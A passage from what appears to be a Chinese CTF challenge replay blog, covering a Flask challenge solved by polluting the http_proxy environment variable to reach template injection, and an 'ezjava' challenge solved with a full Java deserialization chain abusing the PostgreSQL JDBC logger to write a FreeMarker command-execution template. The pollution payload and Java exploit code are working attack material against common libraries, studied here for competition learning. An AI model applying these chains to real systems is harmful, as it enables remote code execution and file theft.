class="string">&#x27;username&#x27;</span>] == username <span class="keyword">and</span> payload[<span class="string">&#x27;password&#x27;</span>] == password:</span><br><span class="line">                response = jsonify(response1)</span><br><span class="line">                response.set_cookie(<span class="string">&#x27;token&#x27;</span>, token)</span><br><span class="line">                <span class="keyword">return</span> response</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> jsonify(response0), <span class="number">401</span></span><br><span class="line">        <span class="keyword">except</span> jwt.ExpiredSignatureError:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Invalid token&#x27;</span>, <span class="number">401</span></span><br><span class="line">        <span class="keyword">except</span> jwt.InvalidTokenError:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Invalid token&#x27;</span>, <span class="number">401</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> jsonify(response2), <span class="number">400</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/api-base/v0/update&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@auth</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">update_password</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                new_password = request.get_json()</span><br><span class="line">                <span class="keyword">if</span> new_password:</span><br><span class="line"></span><br><span class="line">                    update(new_password, User)</span><br><span class="line"></span><br><span class="line">                    updated_token = jwt.encode(&#123;<span class="string">&#x27;username&#x27;</span>: User.username, <span class="string">&#x27;password&#x27;</span>: User.password&#125;,</span><br><span class="line">                                               app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>], algorithm=<span class="string">&#x27;HS256&#x27;</span>)</span><br><span class="line">                    User.token = updated_token</span><br><span class="line">                    response = jsonify(response1)</span><br><span class="line">                    response.set_cookie(<span class="string">&#x27;token&#x27;</span>,updated_token)</span><br><span class="line">                    <span class="keyword">return</span> response</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">return</span> jsonify(response0), <span class="number">401</span></span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Something error?&quot;</span>,<span class="number">505</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> jsonify(response2), <span class="number">400</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> jwt.ExpiredSignatureError:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Invalid token&#x27;</span>, <span class="number">401</span></span><br><span class="line">    <span class="keyword">except</span> jwt.InvalidTokenError:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Invalid token&#x27;</span>, <span class="number">401</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">update</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">        <span class="keyword">for</span> key <span class="keyword">in</span> src:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">isinstance</span>(src[key], <span class="built_in">dict</span>):</span><br><span class="line">                 <span class="keyword">if</span> key <span class="keyword">in</span> dst <span class="keyword">and</span> <span class="built_in">isinstance</span>(src[key], <span class="built_in">dict</span>):</span><br><span class="line">                    update(src[key], dst[key])</span><br><span class="line">                 <span class="keyword">else</span>:</span><br><span class="line">                     dst[key] = src[key]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[key] = src[key]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> key, value <span class="keyword">in</span> src.items() :</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst,key) <span class="keyword">and</span> <span class="built_in">isinstance</span>(value, <span class="built_in">dict</span>):</span><br><span class="line">                update(value,<span class="built_in">getattr</span>(dst, key))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">setattr</span>(dst, key, value)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/api-base/v0/logout&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    response = jsonify(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;Logout successful!&#x27;</span>&#125;)</span><br><span class="line">    response.delete_cookie(<span class="string">&#x27;token&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/api-base/v0/search&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>,<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@auth</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">api</span>():</span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;file&#x27;</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> request.args.get(<span class="string">&#x27;id&#x27;</span>):</span><br><span class="line">                <span class="built_in">id</span> = request.args.get(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">id</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line">            data = requests.get(<span class="string">&quot;http://127.0.0.1:8899/v2/users?file=&quot;</span> + request.args.get(<span class="string">&#x27;file&#x27;</span>) + <span class="string">&#x27;&amp;id=&#x27;</span> + <span class="built_in">id</span>)</span><br><span class="line">            <span class="keyword">if</span> data.status_code != <span class="number">200</span>:</span><br><span class="line">                <span class="keyword">return</span> data.status_code</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> request.args.get(<span class="string">&#x27;type&#x27;</span>) == <span class="string">&quot;text&quot;</span>:</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> render_template_string(data.text)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> jsonify(json.loads(data.text))</span><br><span class="line">        <span class="keyword">except</span> jwt.ExpiredSignatureError:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Invalid token&#x27;</span>, <span class="number">401</span></span><br><span class="line">        <span class="keyword">except</span> jwt.InvalidTokenError:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Invalid token&#x27;</span>, <span class="number">401</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;something error?&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(response2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MemUser</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">setUser</span>(<span class="params">self, username, password</span>):</span><br><span class="line">        self.username = username</span><br><span class="line">        self.password = password</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">setToken</span>(<span class="params">self, token</span>):</span><br><span class="line">        self.token = token</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.username=<span class="string">&quot;admin&quot;</span></span><br><span class="line">        self.password=<span class="string">&quot;password&quot;</span></span><br><span class="line">        self.token=jwt.encode(&#123;<span class="string">&#x27;username&#x27;</span>: self.username, <span class="string">&#x27;password&#x27;</span>: self.password&#125;, app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>], algorithm=<span class="string">&#x27;HS256&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    User = MemUser()</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>这里我们不指定flag文件的名字,当时打算爆破的发现有点长,dockerfile文件里设置了<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20231226005854.png" alt="image.png"><br>我们只能去看原型链污染路由了,当时做到这里就卡住了不知道要去污染什么,secret_key??全局变量???后来看了官方wp发现去污染了环境变量的http_proxy的值,这个值是本机发送http请求使用的代理.我唯一使用过的地方是我的wsl的Linux科学上网会被设置这个代理为Windows的网络,这题可以可以用这个代理来控制响应包的内容,而/api-base/v0/search路由有正好有ssti</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;__init__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;__globals__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;os&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;environ&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;http_proxy&quot;</span><span class="punctuation">:</span><span class="string">&quot;ip:port&quot;</span></span><br><span class="line">                    <span class="punctuation">&#125;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20231226012041.png" alt="image.png"></p>
<p>控制响应:<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20231226012239.png" alt="image.png"></p>
<p>改一下命令<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20231226012421.png" alt="image.png"></p>
<h3 id="ezjava"><a href="#ezjava" class="headerlink" title="ezjava"></a>ezjava</h3><p>这里环境还是有点问题需要我们进去搞一下<br>开容器要设置个环境变量<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -it -p 8081:80 -e D0g3CTF=flag&#123;thisisflag&#125; --entrypoint /bin/bash ezjava-app</span><br></pre></td></tr></table></figure><br>把/app/start.sh的内容在容器内部执行一次,直接复制粘贴即可<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$D0g3CTF</span> &gt; /flag</span><br><span class="line"><span class="built_in">chmod</span> 444 /flag</span><br><span class="line"><span class="built_in">unset</span> D0g3CTF</span><br><span class="line">iptables -P INPUT ACCEPT</span><br><span class="line">iptables -F</span><br><span class="line">iptables -X</span><br><span class="line">iptables -Z</span><br><span class="line">iptables -A INPUT -p tcp --dport 80 -j ACCEPT</span><br><span class="line">iptables -A OUTPUT -m state --state RELATED,ESTABLISHED -j ACCEPT</span><br><span class="line">iptables -A INPUT -p tcp --dport 22 -j ACCEPT</span><br><span class="line">iptables -A OUTPUT -m state --state NEW -j DROP</span><br><span class="line">iptables -P OUTPUT DROP</span><br><span class="line">iptables -n -L</span><br><span class="line">java -jar /app/ezjava.jar</span><br></pre></td></tr></table></figure><br>这题直接就给了反序列化路由<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20231227225051.png" alt="image.png"><br>肯定加了一些黑名单<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20231227225110.png" alt="image.png"><br>这里poe.xml有<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20231227225135.png" alt="image.png"></p>
<p>不出网的docker环境应该覆盖index.ftl来模板渲染,参考:<a href="https://xz.aliyun.com/t/11812#toc-5">https://xz.aliyun.com/t/11812#toc-5</a> 的logger链来写文件,那我们的目标就算调用getter方法来调用BaseDataSource.getConnection,但是黑名单禁了PriorityQueue我们的CB链无法使用,这里参考Boogipop师傅的文章: <a href="https://boogipop.com/2023/12/24/%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%AE%89%E6%B4%B5%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98%E8%B5%9B%20Writeup/#ezjava">https://boogipop.com/2023/12/24/%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%AE%89%E6%B4%B5%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98%E8%B5%9B%20Writeup/#ezjava</a></p>
<p>TreeMap/Bag的利用<br>TreeMap.readObject():<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20231227225600.png" alt="image.png"><br>AbstractMapBag.doReadObject:<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20231227225621.png" alt="image.png"></p>
<p>这里的map是反射修改的TreeMap,TreeMap.put:<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20231227225708.png" alt="image.png"><br>TreeMap.compare:<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20231227225731.png" alt="image.png"><br>这里我们把comparator改为构造好的BeanComparator即可实现任意getter<br>payload:这里payload有这个文章的师傅的: <a href="https://zer0peach.github.io/2023/12/24/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/#%E4%B8%8D%E5%87%BA%E7%BD%91">https://zer0peach.github.io/2023/12/24/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/#%E4%B8%8D%E5%87%BA%E7%BD%91</a><br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ctf.axb;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.bag.TreeBag;</span><br><span class="line"><span class="keyword">import</span> org.postgresql.ds.PGConnectionPoolDataSource;</span><br><span class="line"><span class="keyword">import</span> sun.reflect.ReflectionFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.TreeMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">PGConnectionPoolDataSource</span> <span class="variable">pgConnectionPoolDataSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PGConnectionPoolDataSource</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">loggerLevel</span> <span class="operator">=</span> <span class="string">&quot;debug&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">loggerFile</span> <span class="operator">=</span> <span class="string">&quot;/app/templates/index.ftl&quot;</span>;</span><br><span class="line">        String shellContent=<span class="string">&quot;&lt;#assign ac=springMacroRequestContext.webApplicationContext&gt;\n&quot;</span>+<span class="string">&quot;&lt;#assign fc=ac.getBean(&#x27;freeMarkerConfiguration&#x27;)&gt;\n&quot;</span>+<span class="string">&quot;&lt;#assign dcr=fc.getDefaultConfiguration().getNewBuiltinClassResolver()&gt;\n&quot;</span>+<span class="string">&quot;&lt;#assign VOID=fc.setNewBuiltinClassResolver(dcr)&gt;/$&#123;\&quot;freemarker.template.utility.Execute\&quot;?new()(\&quot;cat /flag\&quot;)&#125;&quot;</span>;</span><br><span class="line">        System.out.println(shellContent);</span><br><span class="line">        <span class="type">String</span> <span class="variable">jdbcUrl</span> <span class="operator">=</span> <span class="string">&quot;jdbc:postgresql://&quot;</span>+<span class="string">&quot;123&quot;</span>+<span class="string">&quot;/aaaa?ApplicationName=&quot;</span>+<span class="string">&quot;123123123&quot;</span>+<span class="string">&quot;&amp;loggerFile=&quot;</span>+loggerFile+<span class="string">&quot;&amp;loggerLevel=&quot;</span>+loggerLevel;</span><br><span class="line">        pgConnectionPoolDataSource.setURL(jdbcUrl);</span><br><span class="line">        pgConnectionPoolDataSource.setServerNames(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;shellContent&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>();</span><br><span class="line">        setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;connection&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">TreeBag</span> <span class="variable">treeBag</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TreeBag</span>(comparator);</span><br><span class="line">        TreeMap&lt;Object,Object&gt; m = <span class="keyword">new</span> <span class="title class_">TreeMap</span>&lt;&gt;();</span><br><span class="line">        setFieldValue(m, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        setFieldValue(m, <span class="string">&quot;modCount&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        Class&lt;?&gt; nodeC = Class.forName(<span class="string">&quot;java.util.TreeMap$Entry&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">nodeCons</span> <span class="operator">=</span> nodeC.getDeclaredConstructor(Object.class, Object.class, nodeC);</span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">MutableInteger</span> <span class="operator">=</span> createWithoutConstructor(<span class="string">&quot;org.apache.commons.collections.bag.AbstractMapBag$MutableInteger&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">node</span> <span class="operator">=</span> nodeCons.newInstance(pgConnectionPoolDataSource,MutableInteger, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">right</span> <span class="operator">=</span> nodeCons.newInstance(pgConnectionPoolDataSource, MutableInteger, node);</span><br><span class="line">        setFieldValue(node, <span class="string">&quot;right&quot;</span>, right);</span><br><span class="line">        setFieldValue(m, <span class="string">&quot;root&quot;</span>, node);</span><br><span class="line">        setFieldValue(m, <span class="string">&quot;comparator&quot;</span>, comparator);</span><br><span class="line">        setFieldValue(treeBag,<span class="string">&quot;map&quot;</span>,m);</span><br><span class="line">        System.out.println(base64serial(treeBag));</span><br><span class="line">        deserTester(treeBag);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">base64serial</span><span class="params">(Object o)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">base64String</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());</span><br><span class="line">        <span class="keyword">return</span> base64String;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">base64deserial</span><span class="params">(String data)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] base64decodedBytes = Base64.getDecoder().decode(data);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(base64decodedBytes);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deserTester</span><span class="params">(Object o)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        base64deserial(base64serial(o));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">createWithoutConstructor</span><span class="params">(String classname)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> createWithoutConstructor(Class.forName(classname));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createWithoutConstructor</span><span class="params">(Class&lt;T&gt; classToInstantiate)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> createWithConstructor(classToInstantiate, Object.class, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createWithConstructor</span><span class="params">(Class&lt;T&gt; classToInstantiate, Class&lt;? <span class="built_in">super</span> T&gt; constructorClass, Class&lt;?&gt;[] consArgTypes, Object[] consArgs)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Constructor&lt;? <span class="built_in">super</span> T&gt; objCons = constructorClass.getDeclaredConstructor(consArgTypes);</span><br><span class="line">        objCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Constructor&lt;?&gt; sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);</span><br><span class="line">        sc.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> (T) sc.newInstance(consArgs);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>)</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">if</span>(field != <span class="literal">null</span>) &#123;</span><br><span class="line">            field.set(obj, value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<p><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20231227231012.png" alt="image.png"><br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20231227231022.png" alt="image.png"></p>
<p>这个payload有个问题我看了两天一直没搞懂,就算为啥要给root赋值为一个TreeMap$Entry对象,看了payload的那篇师傅的文章才搞懂,在writeObject时:<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20231227231413.png" alt="image.png"><br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20231227231424.png" alt="image.png"><br>会调用TreeMap.iterator()函数<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20231227231541.png" alt="image.png"><br>跟进getFirstEntry():<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20231227231605.png" alt="image.png"><br>会变量TreeMap的root变量,root变量定义:<code>private transient Entry&lt;K,V&gt; root;</code><br>这里要通过反射把root变量换成可以变量的TreeMap$Entry类型才行,key就是构造好的pgConnectionPoolDataSource,value是MutableInteger类型,因为对value做了MutableInteger类型转化<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20231227231905.png" alt="image.png"></p>
<p>只有保证writeObject正确写入才能正常readObject,这里还有一个让我疑惑的点是node(也就是root的值)被加了一个right(TreeMap$Entry类型),这题不加这个也可以,因此我们把代码的<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Object right = nodeCons.newInstance(pgConnectionPoolDataSource, MutableInteger, node);  </span></span><br><span class="line"><span class="comment">//setFieldValue(node, &quot;right&quot;, right);</span></span><br></pre></td></tr></table></figure><br>这两行注释掉也可以打通,不影响<br>链子:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TreeBag.readObject</span><br><span class="line">AbstractMapBag.doReadObject</span><br><span class="line">TreeMap.put</span><br><span class="line">TreeMap.compare</span><br><span class="line">BeanComparator.compare</span><br><span class="line">PropertyUtilsBean.getProperty</span><br><span class="line">中间有个循环卡很久,直接shift+f8一直按跳出来</span><br><span class="line">BaseDataSource.getConnection</span><br><span class="line">BaseDataSource.getConnection</span><br><span class="line">直接catch弹出来LOGGER.log:</span><br><span class="line">LOGGER.log(Level.FINE, &quot;Failed to create a &#123;0&#125; for &#123;1&#125; at &#123;2&#125;: &#123;3&#125;&quot;, new Object[]&#123;this.getDescription(), user, this.getUrl(), var4&#125;);</span><br></pre></td></tr></table></figure></p>
<p>参考:</p>
<p><a href="https://boogipop.com/2023/12/24/%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%AE%89%E6%B4%B5%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98%E8%B5%9B%20Writeup/#ezjava">https://boogipop.com/2023/12/24/%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%AE%89%E6%B4%B5%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98%E8%B5%9B%20Writeup/#ezjava</a><br><a href="https://dce.i-soon.net/#/group/detail/31">https://dce.i-soon.net/#/group/detail/31</a><br><a href="https://mrwq.github.io/aggregate-paper/butian/PostgreSQL%20JDBC%20Driver%20RCE%EF%BC%88CVE-2022-21724%EF%BC%89%E4%B8%8E%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%8E%E5%88%86%E6%9E%90/">https://mrwq.github.io/aggregate-paper/butian/PostgreSQL%20JDBC%20Driver%20RCE%EF%BC%88CVE-2022-21724%EF%BC%89%E4%B8%8E%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%8E%E5%88%86%E6%9E%90/</a><br><a href="https://zhuanlan.zhihu.com/p/647418911">https://zhuanlan.zhihu.com/p/647418911</a><br><a href="https://zer0peach.github.io/2023/12/24/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/#%E4%B8%8D%E5%87%BA%E7%BD%91">https://zer0peach.github.io/2023/12/24/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/#%E4%B8%8D%E5%87%BA%E7%BD%91</a></p>
<p>ai_java后面搞</p>
]]></content>
      <categories>
        <category>题目复现</category>
      </categories>
      <tags>
        <tag>题目复现</tag>
      </tags>
  </entry>
  <entry>
    <title>2023京麒CTFsolo-pop复现</title>
    <url>/2024/02/06/2023%E4%BA%AC%E9%BA%92CTFsolo-pop%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<blockquote>
<p>这里用的大头的环境复现的,源文章:<a href="https://www.yuque.com/dat0u/ctf/sderglp3e16086dg">https://www.yuque.com/dat0u/ctf/sderglp3e16086dg</a></p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -it -d -p 12345:80 -e FLAG=flag&#123;8382843b-d3e8-72fc-6625-ba5269953b23&#125; ccr.ccs.tencentyun.com/lxxxin/public:jqctf2023-solo-pop</span><br></pre></td></tr></table></figure>
